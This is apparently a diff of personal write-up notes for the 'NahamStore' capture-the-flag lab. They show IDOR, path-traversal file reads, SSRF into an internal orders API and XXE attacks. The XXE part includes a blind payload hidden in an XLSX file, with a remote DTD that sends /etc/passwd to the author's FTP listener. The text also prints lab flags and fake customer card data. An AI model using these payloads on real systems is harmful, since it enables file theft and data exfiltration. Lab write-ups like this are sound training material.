@@ -2211,3 +2211,1109 @@ Order Date: 21/03/2023 21:42:46
 User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 
 Shipping Address
+Mr Charles Cook
+4754 Swick Hill Street
+Harahan
+Louisiana
+70123
+Order Details
+Order Id: 10
+Order Date: 21/03/2023 21:42:54
+User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Shipping Address
+Mr h1hi h1hi
+h1hi
+h1hi
+123
+Order Details
+Order Id: 11
+Order Date: 21/03/2023 21:43:04
+User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Shipping Address
+Mrs Rita Miles
+3914 Charles Street
+Farmington Hills
+Michigan
+48335
+Order Details
+Order Id: 12
+Order Date: 21/03/2023 21:43:33
+User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+PDF Receipt (press)
+
+http://nahamstore.thm/pdf-generator
+
+POST /pdf-generator HTTP/1.1
+
+Missing POST parameters
+
+let's look source code
+
+<form method="post" action="/pdf-generator" target="_blank">
+<input type="hidden" name="what" value="order">
+<input type="hidden" name="id" value="4">
+<input type="submit" class="btn btn-success" value="PDF Receipt">
+</form>
+
+there are 2 params what and id
+
+what=order&id=3
+
+Order does not belong to this user_id
+
+so add user_id
+
+what=order&id=1&user_id=1
+
+Order does not belong to this user_id (again)
+
+what=order&id=6&user_id=6
+
+after 4 and 5 which are my orders we can obtain other orders
+
+Product Cost
+Total $0.00
+1
+Order # 6
+Shipping Address
+Mr Charles Cook
+4754 Swick Hill Street
+Harahan
+Louisiana
+70123
+Order Details
+Order Id: 6
+Order Date: 21/03/2023 21:42:10
+[NoIcon Annotation]
+
+Send it to intruder
+
+what=order&id=§6§&user_id=§6§ (Using cluster bomb -- 2 payloads )
+
+I see it need to encode it like (ctrl + u)
+
+what=order&id=1%26user_id%3d1
+
+Product Cost
+Sticker Pack $15.00
+Total $15.00
+1
+Order # 1
+Shipping Address
+Rita Miles
+3914 Charles Street
+Farmington Hills
+Michigan
+48335
+Order Details
+Order Id: 1
+Order Date: 22/02/2021 11:42:13
+[NoIcon Annotation]
+
+what=order&id=2%26user_id%3d2
+
+Order does not belong to this user_id
+
+what=order&id=3%26user_id%3d3
+
+Product Cost
+Sticker Pack $15.00
+Total $15.00
+1
+Order # 3
+Shipping Address
+Charles Cook
+4754 Swick Hill Street
+Haran
+Louisiana
+70123
+Order Details
+Order Id: 3
+Order Date: 22/02/2021 11:42:13
+[NoIcon Annotation]
+
+Using Autorize
+
+we need to copy our cookies then create a new acc and visit the links related to the page
+
+like this
+
+Cookie: Insert=injected; cookie=or;
+Header: here
+
+replace with ur cookie param
+
+Cookie: token=91f32...; session=402d...
+
+and go to interception filters and add filter (if u added to target/scope (host: nahamstore )
+
+and now start autorize is off (on)
+
+bypassed means vuln found and enforced not
+
+Modified Reponse, Original Response (the same), Unauthenticated Response (not the same) vuln
+
+Uhmm from our results we didn't find bypass even though there say bypassed
+
+Btw
+we also found at first task in another subdomain
+```
+![[Pasted image 20230321183240.png]]
+First Line of Address
+*160 Broadway*
+Order ID 3 date and time
+*22/02/2021 11:42:13*
+### Local File Inclusion
+Somewhere in the application is an endpoint which allows you to read local files. We've placed a document at /lfi/flag.txt for you to find the contents.
+Answer the questions below
+```text
+Check endpoints of images
+
+open image in a new tab
+
+http://nahamstore.thm/product/picture/?file=cbf45788a7c3ff5c2fab3cbe740595d4.jpg
+
+GET /product/picture/?file=../../../../../etc/passwd HTTP/1.
+
+File does not exist
+
+bypassing
+
+GET /product/picture/?file=....//....//....//....//....//etc/passwd HTTP/1.1
+
+You not not have permission to view this file
+
+check flag
+
+GET /product/picture/?file=....//....//....//....//....//lfi/flag.txt HTTP/1.1
+
+{7ef60e74b711f4c3a1fdf5a131ebf863}
+
+using ffuf
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ locate LFI    
+/usr/share/seclists/Fuzzing/LFI
+/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.tx
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://nahamstore.thm/product/picture/?file=FUZZ" -fs 19
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://nahamstore.thm/product/picture/?file=FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 19
+________________________________________________
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 213ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 204ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 218ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 207ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 207ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 208ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 205ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 207ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 204ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 211ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 191ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 198ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 199ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 193ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 197ms]
+    * FUZZ: ....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 199ms]
+    * FUZZ: ....//....//....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 210ms]
+    * FUZZ: ....//....//....//....//....//....//....//etc/passwd
+
+[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 220ms]
+    * FUZZ: ....//....//....//....//....//etc/passwd
+
+:: Progress: [922/922] :: Job [1/1] :: 200 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
+
+GET /product/picture/?file=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//lfi/flag.txt HTTP/1.1
+
+{7ef60e74b711f4c3a1fdf5a131ebf863}
+```
+LFI Flag
+*{7ef60e74b711f4c3a1fdf5a131ebf863}*
+### SSRF
+The application has an SSRF vulnerability, see how you can exploit it to view an API that shouldn't be available.
+Answer the questions below
+```text
+look for domains
+
+GET /register?redirect_url=127.0.0.1 HTTP/1.1
+
+3420 bytes the same val doing another payloads maybe is whitelisting just accepting nahamstore.thm
+
+Request
+POST /stockcheck HTTP/1.1
+...
+product_id=2&server=stock.nahamstore.thm
+
+Response
+{"id":2,"name":"Sticker Pack","stock":293}
+
+product_id=2&server=stock.nahamstore.thm@stock.nahamstore.thm#
+
+{"server":"stock.nahamstore.thm","endpoints":[{"url":"\/product"}]}
+
+product_id=2&server=stock.nahamstore.thm@stock.nahamstore.thm/product#
+
+{"items":[{"id":1,"name":"Hoodie + Tee","stock":56,"endpoint":"\/product\/1"},{"id":2,"name":"Sticker Pack","stock":293,"endpoint":"\/product\/2"}]}
+
+product_id=2&server=stock.nahamstore.thm@localhost
+
+NahamStore - 404 Page Not Found
+
+so let's add a comment
+
+product_id=2&server=stock.nahamstore.thm@localhost#
+
+NahamStore - Home
+
+Now we need to found and API endpoint
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ locate seclists | grep dns
+/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt
+
+product_id=2&server=stock.nahamstore.thm@§fuzz§.nahamstore.thm#
+
+It will take some time
+
+Much better let's create a wordlist with the word api
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ more /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt | grep api | tee -a api_ssrf
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ more api_ssrf | grep '\-api\|api\-' | tee -a final_api_ssrf
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ wc -l final_api_ssrf                                                
+4732 final_api_ssrf
+
+now let's do it with our wordlist
+
+after a long time
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ cat final_api_ssrf | grep -n internal-api
+2842:internal-api
+2843:internal-api.dev
+2844:internal-api-docs
+2845:internal-api-gw
+2846:internal-api.staging
+2847:internal-api.test
+
+product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm#
+
+different length 346
+
+Response:
+
+{"server":"internal-api.nahamstore.com","endpoints":["\/orders"]}
+
+product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders#
+
+Response:
+
+[{"id":"4dbc51716426d49f524e10d4437a5f5a","endpoint":"\/orders\/4dbc51716426d49f524e10d4437a5f5a"},{"id":"5ae19241b4b55a360e677fdd9084c21c","endpoint":"\/orders\/5ae19241b4b55a360e677fdd9084c21c"},{"id":"70ac2193c8049fcea7101884fd4ef58e","endpoint":"\/orders\/70ac2193c8049fcea7101884fd4ef58e"}]
+
+product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/4dbc51716426d49f524e10d4437a5f5a#
+
+{"id":"4dbc51716426d49f524e10d4437a5f5a","customer":{"id":1,"name":"Rita Miles","email":"rita.miles969@gmail.com","tel":"816-719-7115","address":{"line_1":"3914  Charles Street","city":"Farmington Hills","state":"Michigan","zipcode":"48335"},"items":[{"name":"Sticker Pack","cost":"15.00"}],"payment":{"type":"MasterCard","number":"5376118225360051","expires":"05\/2024","CVV2":"610"}}}
+
+product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/5ae19241b4b55a360e677fdd9084c21c#
+
+{"id":"5ae19241b4b55a360e677fdd9084c21c","customer":{"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","tel":"501-392-5473","address":{"line_1":"3999  Clay Lick Road","city":"Englewood","state":"Colorado","zipcode":"80112"},"items":[{"name":"Hoodie + Tee","cost":"25.00"}],"payment":{"type":"MasterCard","number":"5190216301622131","expires":"11\/2023","CVV2":"223"}}}
+
+Using Burp collaborator
+
+product_id=2&server=stock.nahamstore.thm@tdalp9ofw2fyixw8to5ybeygs7yymn.oastify.com#
+
+Poll now 
+
+The Collaborator server received a DNS lookup of type A for the domain name tdalp9ofw2fyixw8to5ybeygs7yymn.oastify.com.  The lookup was received from IP address 34.242.153.181 at 2023-Mar-22 23:00:21 UTC.
+
+Referer: kayxl6bn5iyptwvamdq2e3uyppvfj4.oastify.com
+
+product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/70ac2193c8049fcea7101884fd4ef58e#
+
+{"id":"70ac2193c8049fcea7101884fd4ef58e","customer":{"id":3,"name":"Charles Cook","email":"maverick1974@hotmail.com","tel":"617-776-8871","address":{"line_1":"4754 Swick Hill Street","city":"Harahan","state":"Louisiana","zipcode":"70123"},"items":[{"name":"Sticker Pack","cost":"15.00"}],"payment":{"type":"Visa","number":"4539923410704592","expires":"12\/2023","CVV2":"715"}}}
+```
+![[Pasted image 20230322180055.png]]
+Credit Card Number For Jimmy Jones
+*5190216301622131*
+### XXE
+Somewhere in the application. there is an endpoint that is vulnerable to an XXE attack. You can use this vulnerability to retrieve files on the server. We've hidden a flag in /flag.txt to find.
+Answer the questions below
+
+## Exploitation
+```text
+look for xml
+
+POST /product/1 HTTP/1.1
+
+HTTP/1.1 401 Unauthorized
+["Missing header X-Token"]
+
+Let's use turbo intruder (Extensions send to turbo intruder)
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ locate seclists | grep param
+/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ more /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt | wc -l
+6453
+
+Here replace it
+
+for word in open('/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt'):
+
+and %s
+
+POST /product/1?%s HTTP/1.1
+
+Attack 
+
+POST /product/1?xml HTTP/1.1
+
+HTTP/1.1 400 Bad Request
+
+Server: nginx/1.14.0 (Ubuntu)
+
+Date: Wed, 22 Mar 2023 22:30:25 GMT
+
+Content-Type: application/xml; charset=utf-8
+
+Transfer-Encoding: chunked
+
+Connection: keep-alive
+
+<?xml version="1.0"?>
+<data><error>Invalid XML supplied</error></data>
+
+send to repeater
+
+Request:
+POST /product/1?xml HTTP/1.1
+
+Host: stock.nahamstore.thm
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: keep-alive
+
+Upgrade-Insecure-Requests: 1
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 71
+
+<?xml version="1.0"?>
+
+<data><error>Invalid XML supplied</error></data>
+
+<?xml version="1.0"?>
+<data><error>X-Token not supplied</error></data>
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
+
+## Detect the vulnerability
+
+Basic entity test, when the XML parser parses the external entities the result should contain "John" in `firstName` and "Doe" in `lastName`. Entities are defined inside the `DOCTYPE` element.
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&example;</lastName>
+ </userInfo>
+
+again
+
+<?xml version="1.0"?>
+
+<!DOCTYPE replace [<!ENTITY example "witty"> ]>
+
+<data><X-Token>&example;</X-Token></data>
+
+<?xml version="1.0"?>
+<data><error>X-Token wittyis invalid</error></data>
+
+Now let's get flag
+
+Request:
+
+<?xml version="1.0"?>
+
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
+
+<data><X-Token>&test;</X-Token></data>
+
+Response:
+
+HTTP/1.1 401 Unauthorized
+
+Server: nginx/1.14.0 (Ubuntu)
+
+Date: Wed, 22 Mar 2023 22:39:33 GMT
+
+Content-Type: application/xml; charset=utf-8
+
+Connection: keep-alive
+
+Content-Length: 1302
+
+<?xml version="1.0"?>
+<data><error>X-Token root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+is invalid
+
+<?xml version="1.0"?>
+
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]>
+
+<data><X-Token>&test;</X-Token></data>
+
+<?xml version="1.0"?>
+<data><error>X-Token {9f18bd8b9acaada53c4c643744401ea8}
+is invalid</error></data>
+
+Now let's search for blind XXE
+
+http://nahamstore.thm/staff
+
+uploading xlsx (Excel)
+
+### XXE inside XLSX file
+
+Structure of the XLSX:
+```
+```text
+$ 7z l xxe.xlsx
+[...]
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+ .....          578          223  _rels/.rels
+ .....          887          508  xl/workbook.xml
+ .....         4451          643  xl/styles.xml
+ .....         2042          899  xl/worksheets/sheet1.xml
+ .....          549          210  xl/_rels/workbook.xml.rels
+ .....          201          160  xl/sharedStrings.xml
+ .....          731          352  docProps/core.xml
+ .....          410          246  docProps/app.xml
+ .....         1367          345  [Content_Types].xml
+------------------- ----- ------------ ------------  ------------------------
+              11216         3586  9 files
+
+Extract Excel file: `7z x -oXXE xxe.xlsx`
+
+Rebuild Excel file:
+```
+```text
+$ cd XXE
+```
+```text
+$ 7z u ../xxe.xlsx *
+
+Add your blind XXE payload inside `xl/workbook.xml`.
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<cdl>&rrr;</cdl>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+
+Alternativly, add your payload in `xl/sharedStrings.xml`:
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
+
+Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file. Instead we build the document once and then change the DTD. And using FTP instead of HTTP allows to retrieve much larger files.
+
+`xxe.dtd`
+
+<!ENTITY % d SYSTEM "file:///etc/passwd">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>"> 
+
+Serve DTD and receive FTP payload using [xxeserv](https://github.com/staaldraad/xxeserv):
+```
+```text
+$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
+
+Let's follow the steps
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ sudo apt install libreoffice 
+
+in my case I didn't have excel 😂
+
+let's install
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ mkdir XXE    
+
+open LibreOffice Calc and save it with test.xlsx (File type Excel 2007, Use Excel)
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ cd XXE                                   
+                                                                                                                                      
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ ls                          
+test.xlsx
+                                                                                                                                      
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ file test.xlsx                                                                                                      
+test.xlsx: Microsoft Excel 2007+
+
+now unzip it
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ unzip test.xlsx                     
+Archive:  test.xlsx
+  inflating: _rels/.rels             
+  inflating: xl/workbook.xml         
+  inflating: xl/styles.xml           
+  inflating: xl/worksheets/sheet1.xml  
+  inflating: xl/_rels/workbook.xml.rels  
+  inflating: xl/sharedStrings.xml    
+  inflating: docProps/core.xml       
+  inflating: docProps/app.xml        
+  inflating: [Content_Types].xml  
+
+so contains xml 
+
+now edit xl/workbook.xml
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ mousepad xl/workbook.xml                                                             
+                                                                                                                                      
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ cat xl/workbook.xml 
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://10.8.19.103:1234/xxe.dtd">%asd;%c;]>
+<cdl>&rrr;</cdl>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+
+here http://10.8.19.103:1234 (replace with ur ip and port u want)
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ mv test.xlsx ../                    
+                                                                                                                                      
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ ls
+'[Content_Types].xml'   docProps   _rels   xl
+
+now rebuild it
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ 7z u xxe.xlsx * 
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz (806EC),ASM,AES-NI)
+
+Scanning the drive:
+5 folders, 9 files, 10724 bytes (11 KiB)
+
+Creating archive: xxe.xlsx
+
+Items to compress: 14
+
+                          
+Files read from disk: 9
+Archive size: 5322 bytes (6 KiB)
+Everything is Ok
+
+and is time to upload it to /staff 
+
+Your timesheet has been uploaded successfully
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.202.146 - - [22/Mar/2023 20:09:40] code 404, message File not found
+10.10.202.146 - - [22/Mar/2023 20:09:40] "GET /xxe.dtd HTTP/1.0" 404 -
+
+so continue with the steps
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ mousepad xxe.dtd        
+                                                                                                                                      
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ cat xxe.dtd 
+<!ENTITY % d SYSTEM "file:///etc/passwd">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.8.19.103:2121/%d;'>"> 
+
+┌──(witty㉿kali)-[~/bug_hunter]
+└─$ git clone https://github.com/staaldraad/xxeserv.git
+Cloning into 'xxeserv'...
+remote: Enumerating objects: 45, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Compressing objects: 100% (4/4), done.
+remote: Total 45 (delta 0), reused 3 (delta 0), pack-reused 41
+Receiving objects: 100% (45/45), 6.63 MiB | 4.40 MiB/s, done.
+Resolving deltas: 100% (15/15), done.
+
+┌──(witty㉿kali)-[~/bug_hunter]
+└─$ cd xxeserv 
+                                                                                                                                      
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ ls
+dtds  payloads.md  README.md  xxeftp.go
+                                                                                                                                      
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ go build                                                                              
+go: cannot find main module, but found .git/config in /home/witty/bug_hunter/xxeserv
+	to create a module there, run:
+	go mod init
+
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ go mod init xxeftp.go
+go: creating new go.mod: module xxeftp.go
+go: to add module requirements and sums:
+	go mod tidy
+
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ go build                                                             
+                                                                                                                                      
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ ls
+dtds  go.mod  payloads.md  README.md  xxeftp.go
+
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ ./xxeftp.go -o files.log -p 2121 -w -wd public -wp 8000 
+ [*] File doesn't exist, creating
+ [*] Storing session into the file: files.log
+ [*] Starting Web Server on 8000 [public]
+[*] No certificate files found in directory. Generating new...
+[*] UNO Listening...
+[*] Certificate files generated
+ [*] GO XXE FTP Server - Port:  2121
+
+in another tab let it run (or if using terminator or tmux is easier)
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ cd XXE       
+                                                                  
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ ls
+'[Content_Types].xml'   _rels   xxe.dtd
+ docProps               xl      xxe.xlsx
+                                                                  
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+
+upload again
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.202.146 - - [22/Mar/2023 20:17:21] "GET /xxe.dtd HTTP/1.0" 200 -
+
+but I don't get it
+
+use php filter base64 (replace in xxe.dtd)
+
+https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ cat xxe.dtd 
+<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.8.19.103:2121/%d;'>">
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.202.146 - - [22/Mar/2023 20:21:46] "GET /xxe.dtd HTTP/1.0" 200 
+
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ ./xxeftp.go -o files.log -p 2121 -w -wd public -wp 8000 
+ [*] File doesn't exist, creating
+ [*] Storing session into the file: files.log
+ [*] Starting Web Server on 8000 [public]
+[*] No certificate files found in directory. Generating new...
+[*] UNO Listening...
+[*] Certificate files generated
+ [*] GO XXE FTP Server - Port:  2121
+ [*] Connection Accepted from [10.10.202.146:33514]
+ [x] Connection Closed
+ [*] Closing FTP Connection
+ [*] Connection Accepted from [10.10.202.146:33518]
+ [x] Connection Closed
+ [*] Closing FTP Connection
+
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ cat files.log   
+USER:  anonymous
+PASS:  anonymous
